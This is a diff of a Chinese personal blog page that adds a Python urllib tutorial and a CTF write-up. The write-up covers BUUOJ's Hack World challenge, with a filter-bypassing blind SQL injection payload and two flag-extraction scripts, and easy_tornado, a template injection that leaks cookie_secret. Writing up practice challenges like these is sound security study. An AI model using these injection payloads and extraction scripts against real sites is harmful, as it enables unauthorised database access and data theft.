@@ -62,6 +62,240 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-python-urllib" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/15/python-urllib/" class="article-date">
+  <time datetime="2020-03-15T11:19:45.000Z" itemprop="datePublished">2020-03-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/03/15/python-urllib/">python urllib</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Python-urllib库"><a href="#Python-urllib库" class="headerlink" title="Python urllib库"></a>Python urllib库</h1><hr>
+<p>urllib 是一个收集了多个用到URL模块的包。</p>
+<p>urllib分为4个主要模块：url.request(打开和读取URL)，url.error(包含url.request抛出的异常)，urllib.parse(用于解析URL)，urllib.robotparser(用于解析robots.txt文件)。</p>
+<h2 id="request"><a href="#request" class="headerlink" title="request"></a><strong>request</strong></h2><p>urllib的request模块可以非常方便地抓取URL内容，也就是发送一个GET请求到指定的页面，然后返回HTTP的响应：</p>
+<p>例如，对百度的一个URL<a href="https://www.baidu.com进行抓取，并返回响应：" target="_blank" rel="noopener">https://www.baidu.com进行抓取，并返回响应：</a></p>
+<pre><code>from urllib import request
+with request.urlopen(&apos;https://www.baidu.com/&apos;) as f:
+    data = f.read()
+    print(&apos;Status:&apos;, f.status, f.reason)
+    for k, v in f.getheaders():
+        print(&apos;%s: %s&apos; % (k, v))
+       print(&apos;Data:&apos;, data.decode(&apos;utf-8&apos;))</code></pre><p><strong>urllib.request.urlopen</strong></p>
+<p>urllib.request.urlopen(url,data=None,[timeout,],cafile=None,capath=None,cadefault=False,context=None)</p>
+<p>这些参数中url是必选的，data是可选的，内容为字节流编码格式的即bytes类型，如果传递data参数，urlopen将使用Post方式请求。timeout是设置等待响应的时长，超出这个时长将抛出异常。</p>
+<p>请求对象，返回一个HTTPResponse类型的对象，包含的方法和属性：</p>
+<p>方法：read()、readinto()、getheader(name)、getheaders()、fileno()</p>
+<p>属性：msg、version、status、reason、bebuglevel、closed</p>
+<p>代码示例：</p>
+<pre><code>from urllib import request
+    rep=request.urlopen(&quot;https://www.baidu.com&quot;)#请求站点返回一个HTTPResponse对象
+    print(rep.read().decode(&apos;utf-8&apos;))   #返回网页内容
+    print(rep.getheader(&apos;server&apos;)) #返回响应头中的server值
+    print(rep.getheaders()) #以列表元祖对的形式返回响应头信息
+        # print(rep.fileno()) #返回文件描述符
+    print(rep.version)  #返回版本信息
+    print(rep.status)  #返回状态码200，404代表网页未找到
+    print(rep.debuglevel) #返回调试等级
+    print(rep.closed)  #返回对象是否关闭布尔值
+    print(rep.geturl()) #返回检索的URL
+    print(rep.info()) #返回网页的头信息
+    print(rep.getcode()) #返回响应的HTTP状态码
+    print(rep.msg)  #访问成功则返回ok
+    print(rep.reason) #返回状态信息</code></pre><p><strong>urllib.request.Requset()</strong></p>
+<p>urllib.request.Request(url,data=None,headers={},origin_req_host=None,unverifiable=False,method=None)</p>
+<p>参数：</p>
+<p>url：请求的URL，必须传递的参数，其他都是可选参数</p>
+<p>data：上传的数据，必须传bytes字节流类型的数据，如果它是字典，可以先用urllib.parse模块里的urlencode()编码</p>
+<p>headers：它是一个字典，传递的是请求头数据，可以通过它构造请求头，也可以通过调用请求实例的方法add_header()来添加</p>
+<p>origin_req_host：指请求方的host名称或者IP地址</p>
+<p>unverifiable：表示这个请求是否是无法验证的，默认为False，如我们请求一张图片如果没有权限获取图片那它的值就是true</p>
+<p>method：是一个字符串，用来指示请求使用的方法，如：GET,POST,PUT等</p>
+<p><strong>parse</strong></p>
+<hr>
+<p>urllib库提供了parse模块，它定义了处理URL的标准接口，如实现URL各部分的抽取，合并以及链接转换，它支持如下协议的URL处理：file,ftp,gopher,hdl,http,https,imap,mailto,mms,news,nntp,prospero,rsync,rtsp,rtspu,sftp,sip,sips,snews,svn,snv+ssh,telnet,wais</p>
+<p><strong>urlparse</strong></p>
+<p>urlparse实现url的实现和分段。返回</p>
+<p>urllib.parse.urlparse(urlstring,scheme=’’,allow_fragments=True)</p>
+<p>参数：urlstring：传递目标url，scheme：协议的类型 scheme(协议),netloc(域名),path(路径),params(参数),query(查询条件),fragment(锚点)</p>
+<pre><code>from urllib import parse
+    url = &apos;https://blog.csdn.net/&apos;
+    result = parse.urlparse(url=url,scheme=&apos;https&apos;,allow_fragments=True)
+    print(result)
+       print(result.scheme)</code></pre><p><strong>urlunparse()</strong></p>
+<p>与urlparse()相反，通过列表或者元祖的形式接受一个可迭代的对象，实现URL构造</p>
+<pre><code>from urllib.parse import urlunparse
+data=[&apos;http&apos;,&apos;www.baidu.com&apos;,&apos;index.html&apos;,&apos;user&apos;,&apos;a=6&apos;,&apos;comment&apos;]
+print(urlunparse(data)) #构造一个完整的URL</code></pre><p><strong>urlsplit</strong></p>
+<p>与urlparse()方法类似，它会返回5个部分，把params合并到path中</p>
+<pre><code>from urllib.parse import urlsplit
+result=urlsplit(&apos;http://www.baidu.com/index.html;user?id=5#comment&apos;)
+print(result)</code></pre><p><strong>urlunsplit</strong></p>
+<p>与urlunparse()类似，它也是将链接的各部分组合完整的链接的方法，传入的参数也是可迭代的对象，如列表元祖等，唯一的区别是长度必须是5个，它省略了params</p>
+<pre><code>from urllib.parse import urlsplit,urlunsplit
+data=[&apos;http&apos;,&apos;www.baidu.com&apos;,&apos;index.html&apos;,&apos;a=5&apos;,&apos;comment&apos;]
+result=urlunsplit(data)
+print(result)</code></pre><p><strong>urljoin</strong></p>
+<p>将两个url结合成一个完整的url</p>
+<pre><code>from urllib.parse import urljoin
+
+print(urljoin(&apos;http://www.baidu.com&apos;,&apos;index.html&apos;))
+print(urljoin(&apos;http://www.baidu.com&apos;,&apos;http://cdblogs.com/index.html&apos;))
+print(urljoin(&apos;http://www.baidu.com/home.html&apos;,&apos;https://cnblog.com/index.html&apos;))</code></pre><p><strong>urlencode</strong></p>
+<p> urlencode()在构造GET请求参数时很有用，它可以将字典转化为GET请求参数</p>
+<pre><code>from urllib.parse import urlencode
+params = {&apos;username&apos;:&apos;zs&apos;,&apos;password&apos;:&apos;123&apos;}
+base_url=&apos;http://www.baidu.com&apos;
+url=base_url+&apos;?&apos;+urlencode(params) #将字典转化为get参数
+print(url)</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/03/15/python-urllib/" data-id="ckeqw4yfv000fj0v9dgpspie6" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-buuoj-Hack-World-easy-tornado" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/15/buuoj-Hack-World-easy-tornado/" class="article-date">
+  <time datetime="2020-03-15T08:58:45.000Z" itemprop="datePublished">2020-03-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/03/15/buuoj-Hack-World-easy-tornado/">buuoj Hack World  easy_tornado</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CISCN-2019-web-Hack-World"><a href="#CISCN-2019-web-Hack-World" class="headerlink" title="CISCN 2019 web Hack World"></a>CISCN 2019 web Hack World</h1><hr>
+<p>进入页面，就有提示让我们传参数id就行。说明这是sql注入中的数字注入给id传整数。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163401714.JPG" alt></p>
+<p>再传一个空值，页面显示”bool(false)”。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163433120.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
+<p>可以联想到布尔型注入，试试用布尔盲注的方法先测试一下，发现union，or，and这些被过滤了,就连空格也被过滤了。不过（）倒是没有被过滤。那么怎么表达逻辑运算？上网搜了一下，发现可以用异或运算符”^”来代替and和or。这里只借助”^”貌似还不够。还要借助sql语句中的if和”%”通配符。</p>
+<p>sql语句中的if有点类似于c语言中的三元运算符。比如if(语句，0，1)如果语句成立的话，就是0。否则就是1。%则是匹配语句。通过利用这些绕过技巧，就可以成功注入。</p>
+<p>下面就是思考如何构造payload。布尔型盲注常用的几个函数left(),ascii(),substr()都可以试一下。但是用ascii()相对来说方便一些。</p>
+<p>构造的payload    <code>&quot;1^if(ascii(substr((select(flag)from(flag)),%d,1)=%d),0,1)&quot;%(num1,num2)</code></p>
+<p>显然，这个payload需要很多次运算。用脚本的话会快得多。</p>
+<pre><code>import requests
+flag=&quot;&quot;
+url=&quot;http://da187932-a027-4cc7-bf31-b5913a3e4a85.node3.buuoj.cn/index.php&quot;
+for i in range(1,60):
+for j in range(32, 129):
+    payload = &quot;1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))&quot; % (i, j)
+    data = {
+        &apos;id&apos;: payload
+    }
+    res = requests.post(url, data=data)
+    if &apos;Hello&apos; in res.text:
+        flag = flag + chr(j)
+        print(flag)
+        link = 1
+        break</code></pre><p>这个脚本运行起来有点慢。在网上发现了大佬的脚本，用二分法写的。运行起来要快了不少。</p>
+<pre><code>import requests
+import time
+
+url = &quot;http://da187932-a027-4cc7-bf31-b5913a3e4a85.node3.buuoj.cn/index.php&quot;
+temp = {&quot;id&quot; : &quot;&quot;}
+flag = &quot;&quot;
+for i in range(1,1000):
+    time.sleep(0.06)
+    low = 32
+       high =128
+    mid = (low+high)//2
+    while(low&lt;high):
+       temp[&quot;id&quot;] = &quot;1^&quot; + &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)^1&quot; %(i,mid)
+       r = requests.post(url,data=temp)
+       print(low,high,mid,&quot;:&quot;)
+       if &quot;Hello&quot; in r.text:
+          low = mid+1
+       else:
+          high = mid
+       mid =(low+high)//2
+    if(mid ==32 or mid ==127):
+        break
+   flag +=chr(mid)
+   print(flag)
+
+
+print(&quot;flag=&quot; ,flag)</code></pre><p>得出来flag，提交。</p>
+<p>#护网杯2018 Easy_tornado</p>
+<hr>
+<p>打开实例，发现页面给了三个文件地址。打开看看有什么信息。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163623138.JPG" alt></p>
+<p>发现flag.txt下提示flag就在/fllllllllllllag里面。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163543953.JPG" alt></p>
+<p>再打开hints.txt,看看有什么提示信息。页面提示”<code>md5(cookie_secret+md5(filename))</code>“。再看看url，发现有一个参数”filehash”。再结合MD5这个提示，说明这个参数可能就是md5(cookie_secret+md5(filename))后的结果。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163613951.JPG" alt></p>
+<p>打开welcome.txt,发现提示”render”。一开始不明白这什么意思，在网上看了wp才发现这是提示模板注入。题名tornado也说明可能和t模板注入有关。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163636990.JPG" alt></p>
+<p><strong>什么是模板注入？</strong></p>
+<p>模板注入（SSTI）和sql注入有点类似，也是通过输入在后端的渲染处理上拼接成语句。ssti和常见到的web注入一样，都是服务端接受了用户的输入，将其作为web模板的一部分。在进行模板渲染的过程中执行了用户插入的恶意内容。</p>
+<p>模板注入是基于模板渲染处理的，模板渲染又分为前端渲染，后端渲染，浏览器渲染。这里给出一个ssti的例子：</p>
+<pre><code>$output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); 
+echo $output;</code></pre><p>这样可以通过用户传的参数name来实现模板注入。利用模板变量来实现页面执行用户输入的恶意代码。(使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于 GET 请求参数 $_GET[“name”]。)</p>
+<p>这样可以考虑构造payload     <code>file?filename=/flllllllllllag&amp;filehash=mad5(cookie_secret+md5(/flllllllllllllag))</code> 但是<code>cookie_secret</code>怎么获取？这是就要用到tornado模板。和sql注入一样,ssti注入也需要先找一下注入点.</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315164940300.JPG" alt></p>
+<p>直接输入filename=/flllllllllag,页面会报错。并且浏览器上的url显示error?msg=Error.说明可以构造error?msg=  先试试error?msg=2,只输出了2。在试试error?msg=6,没有出现cookie。说明这些操作符被过滤了，这个时候要用到tornado中的handler.settings对象。构造error?msg=,页面显示cookie_secret。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163734295.JPG" alt></p>
+<p>再把cookie_secret代入到payload中，得到flag。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163743169.JPG" alt></p>
+<p>当然也可以写个脚本，菜鸟在网上找了一个脚本，但运行时报错。提示TypeError: Unicode-objects must be encoded before hashing。当时想那个地方可能没有指定编码格式。确实，在update函数要指定传入的参数的编码格式。</p>
+<pre><code>#!-*-coding:utf-8 -*-
+import hashlib
+def md5(s):
+    md5 = hashlib.md5()
+    md5.update(s.encode(&quot;utf-8&quot;))
+    return md5.hexdigest()
+def filehash():
+    filename = &apos;/fllllllllllllag&apos;
+    cookie_secret = &apos;c6862c2d-66a0-4465-af17-58a23841583b&apos;
+    print(md5(cookie_secret + md5(filename)))
+if __name__ == &apos;__main__&apos;:
+    filehash()</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/03/15/buuoj-Hack-World-easy-tornado/" data-id="ckeqw4yf50006j0v9w11hqbov" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-leetcode-dynamic-programming-2" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/03/10/leetcode-dynamic-programming-2/" class="article-date">
@@ -248,7 +482,7 @@ return dp[s.length()-1]；
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/10/leetcode-dynamic-programming-2/" data-id="ckeilds190007k0v9l20wrgu7" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/03/10/leetcode-dynamic-programming-2/" data-id="ckeqw4yfj0008j0v9va4ct3ue" class="article-share-link">Share</a>
       
       
     </footer>
@@ -434,7 +668,7 @@ return dp[s.length()-1]；
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/08/leetcode-动态规划-2/" data-id="ckeilds1d000ak0v9vo0aru12" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/03/08/leetcode-动态规划-2/" data-id="ckeqw4yfm000aj0v9zotg4wkb" class="article-share-link">Share</a>
       
       
     </footer>
@@ -501,7 +735,7 @@ Resource ：前面已经介绍过了，即指定资源文件，存的就是配�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/02/29/Metasploit学习笔记/" data-id="ckeilds100002k0v9rv79w9jo" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/02/29/Metasploit学习笔记/" data-id="ckeqw4yf10003j0v9e7stlzar" class="article-share-link">Share</a>
       
       
     </footer>
@@ -699,7 +933,7 @@ public int uniquePaths(int m, int n) {//n为行数，m为列数
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/02/25/leetcode-动态规划-1/" data-id="ckeilds1a0008k0v9bsi1kox9" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/02/25/leetcode-动态规划-1/" data-id="ckeqw4yfp000bj0v9yskx2e0f" class="article-share-link">Share</a>
       
       
     </footer>
@@ -770,7 +1004,7 @@ print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/12/02/xss/" data-id="ckeilds1i000dk0v9b89sbjj8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/12/02/xss/" data-id="ckeqw4yfy000ij0v9fy722zri" class="article-share-link">Share</a>
       
       
     </footer>
@@ -908,7 +1142,7 @@ if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/10/22/新文档/" data-id="ckeilds1u000hk0v9wnsmyf9v" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/10/22/新文档/" data-id="ckeqw4yg2000jj0v9w60egu9o" class="article-share-link">Share</a>
       
       
     </footer>
@@ -957,7 +1191,7 @@ if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/06/04/hello-world/" data-id="ckeilds1c0009k0v9urkyo0cn" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/06/04/hello-world/" data-id="ckeqw4yf70007j0v91v8of1fi" class="article-share-link">Share</a>
       
       
     </footer>
@@ -990,7 +1224,7 @@ if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
     </div>
   </div>
 
@@ -1003,6 +1237,14 @@ if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
       <ul>
         
           <li>
+            <a href="/2020/09/06/new-post/">new post</a>
+          </li>
+        
+          <li>
+            <a href="/2020/09/06/springboot分页-pageable作参数以及List转换为Page/">springboot分页 pageable作参数以及List转换为Page</a>
+          </li>
+        
+          <li>
             <a href="/2020/08/31/vue-element-admin用户登录流程/">vue-element-admin用户登录流程</a>
           </li>
         
@@ -1012,14 +1254,6 @@ if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
         
           <li>
             <a href="/2020/04/26/BUUCTF-old-hack/">BUUCTF old hack</a>
-          </li>
-        
-          <li>
-            <a href="/2020/04/26/RoarCTF2019-easy-Java/">RoarCTF2019 easy Java</a>
-          </li>
-        
-          <li>
-            <a href="/2020/04/25/SWPUCTF2019 web1/">(no title)</a>
           </li>
         
       </ul>
